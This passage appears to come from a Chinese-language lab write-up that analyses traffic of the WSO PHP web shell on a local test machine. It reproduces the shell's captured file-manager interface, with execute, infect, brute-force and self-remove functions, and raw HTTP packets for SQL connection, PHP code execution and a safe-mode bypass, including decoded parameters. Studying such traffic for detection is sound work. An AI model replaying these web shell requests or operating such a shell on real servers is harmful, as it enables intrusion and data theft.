	</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux ubuntu 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 <a href="http://noreferer.de/?http://www.google.com/search?q=Linux+ubuntu+3.19.0-25-generic+%2326%7E14.04.1-Ubuntu+SMP+Fri+Jul+24+21%3A16%3A20+UTC+2015+x86_64" target="_blank">[ Google ]</a> <a href="http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=Linux+Kernel+3.19.0" target=_blank>[ Exploit-DB ]</a></nobr><br>33 ( www-data ) <span>Group:</span> 33 ( www-data )<br>5.5.9-1ubuntu4.19 <span>Safe mode:</span> <font color=#FFDB5F><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2016-11-04 00:11:02<br>18.58 GB <span>Free:</span> 13.12 GB (70.61%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/var/")'>var/</a><a href='#' onclick='g("FilesMan","/var/www/")'>www/</a><a href='#' onclick='g("FilesMan","/var/www/html/")'>html/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/")'>webshell-master/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/")'>php/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/wso/")'>wso/</a> <font color=#FFDB5F><b>drwxrwxrwx</b></font> <a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)"><option value="UTF-8" selected>UTF-8</option><option value="Windows-1251" >Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></select></label><br><span>Server IP:</span><br>192.168.182.143<br><span>Client IP:</span><br>192.168.182.1</nobr></td></tr></table><table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr><th>[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th>[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th>[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th>[ <a href="#" onclick="g('Infect',null,'','','')">Infect</a> ]</th><th>[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th>[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th>[ <a href="#" onclick="g('SafeMode',null,'','','')">Safe mode</a> ]</th><th>[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th>[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th>[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th>[ <a href="#" onclick="g('Logout',null,'','','')">Logout</a> ]</th><th>[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div><h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script><script>
		function sa() {
			for(i=0;i<d.files.elements.length;i++)
				if(d.files.elements[i].type == 'checkbox')
					d.files.elements[i].checked = d.files.elements[0].checked;
		}
	</script>
	<table width='100%' class='main' cellspacing='0' cellpadding='2'>
	<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g("FilesMan",null,"s_name_0")'>Name</a></th><th><a href='#' onclick='g("FilesMan",null,"s_size_0")'>Size</a></th><th><a href='#' onclick='g("FilesMan",null,"s_modify_0")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g("FilesMan",null,"s_perms_0")'>Permissions</a></th><th>Actions</th></tr><tr><td><input type=checkbox name="f[]" value=".." class=chkbx></td><td><a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso/..');" ><b>[ .. ]</b></a></td><td>dir</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'..','chmod')"><font color=white><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'..', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'..', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="hello.txt" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'hello.txt', 'view')">hello.txt</a></td><td>5 B</td><td>2016-11-03 23:18:32</td><td>www-data/www-data</td><td><a href=# onclick="g('FilesTools',null,'hello.txt','chmod')"><font color=#FFDB5F><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'hello.txt', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'hello.txt', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'hello.txt', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'hello.txt', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'hello.txt', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="readme.md" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'readme.md', 'view')">readme.md</a></td><td>1.73 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'readme.md','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'readme.md', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'readme.md', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'readme.md', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'readme.md', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'readme.md', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="test.txt" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'test.txt', 'view')">test.txt</a></td><td>754 B</td><td>2016-11-03 23:38:06</td><td>www-data/www-data</td><td><a href=# onclick="g('FilesTools',null,'test.txt','chmod')"><font color=#FFDB5F><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'test.txt', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'test.txt', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'test.txt', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'test.txt', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'test.txt', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.1.3.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.1.3.php', 'view')">wso-4.1.3.php</a></td><td>75.76 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.1.3.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso-4.2.0.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.0.php', 'view')">wso-4.2.0.php</a></td><td>86.53 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.0.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.2.1.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.1.php', 'view')">wso-4.2.1.php</a></td><td>75.72 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.1.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso-4.2.2.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.2.php', 'view')">wso-4.2.2.php</a></td><td>75.71 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.2.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.2.3.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.3.php', 'view')">wso-4.2.3.php</a></td><td>76.26 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.3.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso-4.2.4.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.4.php', 'view')">wso-4.2.4.php</a></td><td>76.41 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.4.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.2.5.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.5.php', 'view')">wso-4.2.5.php</a></td><td>77.86 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.5.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso.php', 'view')">wso.php</a></td><td>61.58 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso2.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso2.php', 'view')">wso2.php</a></td><td>64.56 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso2.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso2.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso2.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso2.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso2.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso2.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso2_pack.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso2_pack.php', 'view')">wso2_pack.php</a></td><td>24.17 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso2_pack.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso_404.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso_404.php', 'view')">wso_404.php</a></td><td>105.04 KB</td><td>2016-11-03 17:58:16</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso_404.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso_404.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso_404.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso_404.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso_404.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso_404.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="WSO_4_0_5.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'WSO_4_0_5.php', 'view')">WSO_4_0_5.php</a></td><td>67.72 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'WSO_4_0_5.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="WSO_base64.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'WSO_base64.php', 'view')">WSO_base64.php</a></td><td>82.16 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'WSO_base64.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx', 'view')">-.docx</a></td><td>16.17 KB</td><td>2016-11-03 23:25:44</td><td>www-data/www-data</td><td><a href=# onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx','chmod')"><font color=#FFDB5F><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx', 'download')">D</a></td></tr><tr id=fak><td colspan=7>
		<input type=hidden name=ne value=''>
		<input type=hidden name=a value='FilesMan'>
		<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
		<input type=hidden name=charset value='UTF-8'>
		<label><select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><option value='zip'>+ zip</option><option value='unzip'>- zip</option><option value='tar'>+ tar.gz</option></select></label><input type='submit' value='submit'></td></tr></form></table></div>
	</div>
	<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
		<tr>
			<td><form onsubmit="g(null,this.c.value,'');return false;"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/var/www/html/webshell-master/php/wso/'><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
			<td><form method='post' ENCTYPE='multipart/form-data'>
			<input type=hidden name=a value='FilesMan'>
			<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
			<input type=hidden name=p1 value='uploadFile'>
			<input type=hidden name=ne value=''>
			<input type=hidden name=charset value='UTF-8'>
			<span>Upload file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
		</tr></table></div>
		<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
		<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
		</body></html>

#### 4.5.2&emsp;数据包分析 ####
>请求数据包攻击载荷：<font color=red>ne=&a=Sql&p1=&p2=&c=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2F&charset=UTF-8&type=mysql&sql_host=localhost&sql_login=root&sql_pass=123456&sql_base=mysql&c=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2F</font>

>数据包攻击载荷攻击载荷分析：ne=&a=Sql&p1=&p2=&c=/var/www/html/webshell-master/php/wso/&charset=UTF-8&type=mysql&sql_host=localhost&sql_login=root&sql_pass=123456&sql_base=mysql&c=/var/www/html/webshell-master/php/wso/，数据库连接信息。

>响应包具体分析：该响应包仍然返回的是整个html页面。

>具体信息如图4.5.2所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/sql_conn.png)<br><center>图4.5.2</center>

### 4.6&emsp;php代码执行操作 ###
#### 4.6.1&emsp;数据包内容 ####
**请求数据包**
<br>

	POST /webshell-master/php/wso/wso-4.2.5.php HTTP/1.1
	Host: 192.168.182.143
	Connection: keep-alive
	Content-Length: 175
	Origin: http://192.168.182.143
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
	Content-Type: application/x-www-form-urlencoded
	Accept: */*
	Referer: http://192.168.182.143/webshell-master/php/wso/wso-4.2.5.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.8
	Cookie: da94407ecf64bda7c0ac6ea1fa4477d8key=d69aa478a72ecd3a99c77af6fcf6b917; da94407ecf64bda7c0ac6ea1fa4477d8=21232f297a57a5a743894a0e4a801fc3; pass=fb621f5060b9f65acf8eb4232e3024140dea2b34
	
	ajax=true&a=DwMxQg%3D%3D&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=ABMXWjsuBFkvPT4bLD1yCz0AaAM7EzpcFg1eDg%3D%3D&p2=&p3=&charset=UTF-8

**响应数据包**
<br>

	HTTP/1.1 200 OK
	Date: Fri, 04 Nov 2016 09:12:40 GMT
	Server: Apache/2.4.7 (Ubuntu)
	X-Powered-By: PHP/5.5.9-1ubuntu4.19
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 103
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
	Content-Type: text/html
	
	116
	document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='hello world';

#### 4.6.2&emsp;数据包分析 ####
>请求数据包攻击载荷：<font color=red>ajax=true&a=DwMxQg%3D%3D&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=ABMXWjsuBFkvPT4bLD1yCz0AaAM7EzpcFg1eDg%3D%3D&p2=&p3=&charset=UTF-8</font>

>数据包攻击载荷攻击载荷分析：ajax=true&a=DwMxQg==&c=FncDXTo+fAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ==&p1=ABMXWjsuBFkvPT4bLD1yCz0AaAM7EzpcFg1eDg==&p2=&p3=&charset=UTF-8，解密函数进行解密：ajax=true&a=Php&c=/var/www/html/webshell-master/php/wso/&p1=/var/www/html/webshell-master/php/wso/&p1=echo "hello world";&p2=&p3=&charset=UTF-8

>响应包具体分析：该响应包进行ajax提交方式,数据包数据只返回相应的结果数据，观察相应数据后发现，该输出框通过js脚本document.getElementById('PhpOutput').innerHTML获得页面内容。

>具体信息如图4.6.1所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/php_code.png)<br><center>图4.6.1</center>

### 4.7&emsp;Safe mode bypass ###
#### 4.7.1&emsp;数据包内容 ####
**请求数据包**
<br>

	POST /webshell-master/php/wso/wso-4.2.5.php HTTP/1.1
	Host: 192.168.182.143
	Connection: keep-alive
	Content-Length: 163
	Cache-Control: max-age=0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Origin: http://192.168.182.143
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
	Content-Type: application/x-www-form-urlencoded
	Referer: http://192.168.182.143/webshell-master/php/wso/wso-4.2.5.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.8
	Cookie: da94407ecf64bda7c0ac6ea1fa4477d8key=d69aa478a72ecd3a99c77af6fcf6b917; da94407ecf64bda7c0ac6ea1fa4477d8=21232f297a57a5a743894a0e4a801fc3
	
	a=D3YfWAMCdEYUPT1V&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=FBVkCA%3D%3D&p2=FwVkCA%3D%3D&p3=FxAYQhQWeA0%3D&charset=UTF-8

**响应数据包**
<br>

	HTTP/1.1 200 OK
	Date: Mon, 07 Nov 2016 00:47:02 GMT
	Server: Apache/2.4.7 (Ubuntu)
	X-Powered-By: PHP/5.5.9-1ubuntu4.19
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 5240
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
	Content-Type: text/html

